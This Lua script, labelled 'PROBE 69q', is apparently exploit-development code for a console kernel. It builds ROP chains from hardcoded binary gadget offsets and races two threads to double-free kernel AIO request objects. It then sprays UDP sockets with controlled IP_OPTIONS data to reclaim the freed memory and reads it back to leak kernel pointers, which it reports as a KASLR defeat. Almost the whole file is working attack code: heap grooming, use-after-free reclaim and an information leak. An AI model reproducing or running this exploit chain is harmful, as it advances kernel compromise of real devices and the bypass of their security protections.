-- CRASH_CLASS: HIGH
-- PROBE 69q: Controlled-data spray via setsockopt IP_OPTIONS
--
-- R is 48B in a 64B UMA bucket. IP_OPTIONS (max 40 bytes) may allocate
-- from the same bucket. If so, we control all 40 bytes including
-- offsets 0-15 which correspond to R+0x00/R+0x08 (kernel thread ptrs).
--
-- Chain: double-free R -> spray IP_OPTIONS (40B with sentinels) ->
-- getsockopt readback to check for kernel pointer contamination.
--
-- If the spray object overlaps a freed R that was reclaimed by another
-- AIO submit, getsockopt may return kernel thread pointers.
--
-- Also tests: does setsockopt IP_OPTIONS actually allocate from a zone?
-- Use 624 delta to measure.

print("=== PROBE 69q: CONTROLLED IP_OPTIONS SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then return true end
    return false
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local data_buf = memory.alloc(0x1000)
local reqs = memory.alloc(0x30)

local function aio_submit(fd)
    local id_out = memory.alloc(8); wd(N(id_out), 0)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    wq(N(reqs) + 0x10, uint64(N(data_buf)))
    wq(N(reqs) + 0x18, uint64(N(memory.alloc(8))))
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    pcall(function() mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_out))) end)
    return rd(N(id_out)) or 0
end

local function aio_poll(id)
    local one_id = memory.alloc(8); wd(N(one_id), id)
    local one_st = memory.alloc(8); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- ============================================================
-- [A] Test IP_OPTIONS setsockopt/getsockopt roundtrip
-- ============================================================
print("[A] IP_OPTIONS roundtrip test")

local IPPROTO_IP = 0
local IP_OPTIONS = 1

local test_sock = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
print("  UDP socket fd=" .. test_sock)

if test_sock >= 0 then
    -- Write 40 bytes of controlled data
    local opt_data = memory.alloc(48)
    for i = 0, 36, 4 do wd(N(opt_data) + i, 0xDEAD0000 + i) end

    local set_ret = -999
    pcall(function()
        set_ret = sgn(mk(54)(uint64(test_sock), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
            uint64(N(opt_data)), uint64(40)))
    end)
    print("  setsockopt(IP_OPTIONS, 40B) ret=" .. set_ret)

    if set_ret == 0 then
        -- Read back
        local get_buf = memory.alloc(48)
        local get_len = memory.alloc(8)
        for i = 0, 44, 4 do wd(N(get_buf) + i, 0xBBBBBBBB) end
        wd(N(get_len), 44)

        local get_ret = -999
        pcall(function()
            get_ret = sgn(mk(55)(uint64(test_sock), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                uint64(N(get_buf)), uint64(N(get_len))))
        end)
        local retlen = rd(N(get_len)) or 0
        print(string.format("  getsockopt ret=%d len=%d", get_ret, retlen))

        -- Dump what came back
        local line = "  data: "
        for i = 0, math.min(retlen - 1, 39), 4 do
            line = line .. string.format("%08X ", rd(N(get_buf) + i) or 0)
        end
        print(line)
    else
        print("  IP_OPTIONS setsockopt FAILED — trying smaller sizes")
        for sz = 4, 40, 4 do
            for i = 0, sz - 1, 4 do wd(N(opt_data) + i, 0xAA000000 + sz + i) end
            local r = -999
            pcall(function()
                r = sgn(mk(54)(uint64(test_sock), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                    uint64(N(opt_data)), uint64(sz)))
            end)
            if r == 0 then
                print(string.format("    IP_OPTIONS size=%d: OK", sz))
                break
            end
        end
    end

    pcall(function() mk(6)(uint64(test_sock)) end)
end

if not alive() then print("DEAD after [A]"); return end

-- ============================================================
-- [B] 624 delta for IP_OPTIONS spray
-- ============================================================
print("")
print("[B] 624 delta for 200 sockets with IP_OPTIONS")

local pre_624 = nil
pcall(function() pre_624 = mk(624)(uint64(0)) end)

local spray_fds = {}
local opt_data = memory.alloc(48)
-- Sentinel at +0: 0xDEADBEEFCAFE0001, at +8: 0xFEEDFACEBABE0002
wd(N(opt_data), 0xCAFE0001); wd(N(opt_data) + 4, 0xDEADBEEF)
wd(N(opt_data) + 8, 0xBABE0002); wd(N(opt_data) + 12, 0xFEEDFACE)
for i = 16, 36, 4 do wd(N(opt_data) + i, 0x41410000 + i) end

local set_ok = 0
for i = 1, 200 do
    if not alive() then break end
    local fd = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
    if fd >= 0 then
        table.insert(spray_fds, fd)
        local r = -999
        pcall(function()
            r = sgn(mk(54)(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                uint64(N(opt_data)), uint64(40)))
        end)
        if r == 0 then set_ok = set_ok + 1 end
    end
end

local post_624 = nil
pcall(function() post_624 = mk(624)(uint64(0)) end)
local delta = 0
if pre_624 and post_624 then delta = N(post_624) - N(pre_624) end

print(string.format("  created %d sockets, %d IP_OPTIONS set, 624 delta=%d",
    #spray_fds, set_ok, delta))
if set_ok > 0 then
    print(string.format("  estimated per-socket delta=%.1f", delta / #spray_fds))
end

-- Verify readback on one socket
if #spray_fds > 0 and set_ok > 0 then
    local get_buf = memory.alloc(48)
    local get_len = memory.alloc(8)
    wd(N(get_len), 44)
    pcall(function()
        mk(55)(uint64(spray_fds[1]), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
            uint64(N(get_buf)), uint64(N(get_len)))
    end)
    local q0 = rq(N(get_buf))
    local q1 = rq(N(get_buf) + 8)
    print(string.format("  readback[0]: %s  readback[8]: %s", fmt(q0), fmt(q1)))
end

-- Cleanup spray sockets
for _, fd in ipairs(spray_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end
spray_fds = {}

if not alive() then print("DEAD after [B]"); return end

-- ============================================================
-- [C] Double-free + IP_OPTIONS spray + getsockopt readback
-- ============================================================
print("")
print("[C] Double-free + IP_OPTIONS spray + readback")

local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local kptrs_found = 0

local c_done = false
for attempt = 1, 8 do
    if c_done or not alive() then break end
    repeat
        local ids = {}
        for i = 1, BATCH do
            local id = aio_submit(fd_zero)
            if id ~= 0 then aio_poll(id); table.insert(ids, id) end
        end
        if #ids < 8 then c_done = true; break end

        for i = 0, #ids - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end

        local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
        local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(del_ids)) end

        local doubles = 0
        for i = 0, #ids - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end

        if not alive() then c_done = true; break end
        if doubles == 0 then
            if attempt <= 3 then print(string.format("  attempt %d: no doubles", attempt)) end
            break
        end

        print(string.format("  attempt %d: %d doubles — spraying IP_OPTIONS", attempt, doubles))

        -- Spray 200 sockets with IP_OPTIONS
        local s_fds = {}
        -- Use per-socket sentinel in first 8 bytes
        for i = 1, 200 do
            if not alive() then break end
            local fd = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
            if fd >= 0 then
                table.insert(s_fds, fd)
                wd(N(opt_data), 0xCA000000 + i)
                wd(N(opt_data) + 4, 0xFE000000 + i)
                wd(N(opt_data) + 8, 0xBA000000 + i)
                wd(N(opt_data) + 12, 0xDA000000 + i)
                pcall(function()
                    mk(54)(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                        uint64(N(opt_data)), uint64(40))
                end)
            end
        end
        print(string.format("    sprayed %d sockets", #s_fds))

        -- Readback: check each socket for kernel pointer contamination
        local get_buf = memory.alloc(48)
        local get_len = memory.alloc(8)

        for idx, fd in ipairs(s_fds) do
            if not alive() then break end
            for j = 0, 44, 4 do wd(N(get_buf) + j, 0) end
            wd(N(get_len), 44)

            pcall(function()
                mk(55)(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                    uint64(N(get_buf)), uint64(N(get_len)))
            end)

            -- Check first 16 bytes for kernel pointers
            local q0 = rq(N(get_buf))
            local q1 = rq(N(get_buf) + 8)

            if is_kptr(q0) then
                local h, l = get_hi_lo(q0)
                print(string.format("    *** KPTR at +0 fd=%d idx=%d: 0x%08X%08X ***", fd, idx, h, l))
                kptrs_found = kptrs_found + 1
            end
            if is_kptr(q1) then
                local h, l = get_hi_lo(q1)
                print(string.format("    *** KPTR at +8 fd=%d idx=%d: 0x%08X%08X ***", fd, idx, h, l))
                kptrs_found = kptrs_found + 1
            end

            -- Also check if our sentinel was replaced with something else
            local expected_lo = 0xCA000000 + idx
            local got_lo = rd(N(get_buf)) or 0
            if got_lo ~= expected_lo and got_lo ~= 0 and idx <= 10 then
                print(string.format("    fd=%d: expected 0x%08X got 0x%08X (contaminated?)",
                    fd, expected_lo, got_lo))
            end
        end

        -- Cleanup
        for _, fd in ipairs(s_fds) do
            pcall(function() mk(6)(uint64(fd)) end)
        end

        c_done = true
    until true
end

if not alive() then print("DEAD after [C]"); return end

-- ============================================================
-- [D] Double-free + AIO resubmit + IP_OPTIONS spray + readback
-- ============================================================
print("")
print("[D] Double-free + AIO resubmit + IP_OPTIONS readback")

local d_done = false
for attempt = 1, 8 do
    if d_done or not alive() then break end
    repeat
        local ids = {}
        for i = 1, BATCH do
            local id = aio_submit(fd_zero)
            if id ~= 0 then aio_poll(id); table.insert(ids, id) end
        end
        if #ids < 8 then d_done = true; break end

        for i = 0, #ids - 1 do
            wd(N(del_ids) + i * 4, ids[i + 1])
            wd(N(states_A) + i * 4, 0xAAAAAAAA)
            wd(N(states_B) + i * 4, 0xBBBBBBBB)
        end

        local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
        local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)
        for w = 1, 50000 do local _ = rd(N(del_ids)) end

        local doubles = 0
        for i = 0, #ids - 1 do
            local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
            local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
            if sA == 0 and sB == 0 then doubles = doubles + 1 end
        end

        if not alive() then d_done = true; break end
        if doubles == 0 then break end

        print(string.format("  attempt %d: %d doubles", attempt, doubles))

        -- Resubmit AIO: new R objects may reclaim freed slots
        local new_ids = {}
        for i = 1, 32 do
            local nid = aio_submit(fd_zero)
            if nid ~= 0 then table.insert(new_ids, nid) end
        end
        print(string.format("    resubmitted %d AIO", #new_ids))

        -- Now spray IP_OPTIONS: these may reclaim the OTHER copy
        local s_fds = {}
        for i = 1, 200 do
            if not alive() then break end
            local fd = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
            if fd >= 0 then
                table.insert(s_fds, fd)
                wd(N(opt_data), 0xDD000000 + i)
                wd(N(opt_data) + 4, 0xEE000000 + i)
                pcall(function()
                    mk(54)(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                        uint64(N(opt_data)), uint64(40))
                end)
            end
        end

        -- Readback sockets for kernel pointer contamination from new R
        local get_buf = memory.alloc(48)
        local get_len = memory.alloc(8)

        for idx, fd in ipairs(s_fds) do
            if not alive() then break end
            wd(N(get_len), 44)
            pcall(function()
                mk(55)(uint64(fd), uint64(IPPROTO_IP), uint64(IP_OPTIONS),
                    uint64(N(get_buf)), uint64(N(get_len)))
            end)
            local q0 = rq(N(get_buf))
            local q1 = rq(N(get_buf) + 8)
            if is_kptr(q0) then
                local h, l = get_hi_lo(q0)
                print(string.format("    *** KPTR +0 fd=%d: 0x%08X%08X ***", fd, h, l))
                kptrs_found = kptrs_found + 1
            end
            if is_kptr(q1) then
                local h, l = get_hi_lo(q1)
                print(string.format("    *** KPTR +8 fd=%d: 0x%08X%08X ***", fd, h, l))
                kptrs_found = kptrs_found + 1
            end
        end

        for _, fd in ipairs(s_fds) do pcall(function() mk(6)(uint64(fd)) end) end
        for _, nid in ipairs(new_ids) do
            aio_poll(nid)
            local d_ids2 = memory.alloc(8); wd(N(d_ids2), nid)
            local d_st2 = memory.alloc(8)
            pcall(function() mk(662)(uint64(N(d_ids2)), uint64(1), uint64(N(d_st2))) end)
        end

        d_done = true
    until true
end

print("")
print(string.format("TOTAL KERNEL POINTERS: %d", kptrs_found))
if kptrs_found > 0 then
    print("*** KASLR DEFEAT VIA IP_OPTIONS SPRAY ***")
else
    print("IP_OPTIONS may not share R's zone, or needs higher volume")
end

print("")
print("=== PROBE 69q COMPLETE ===")
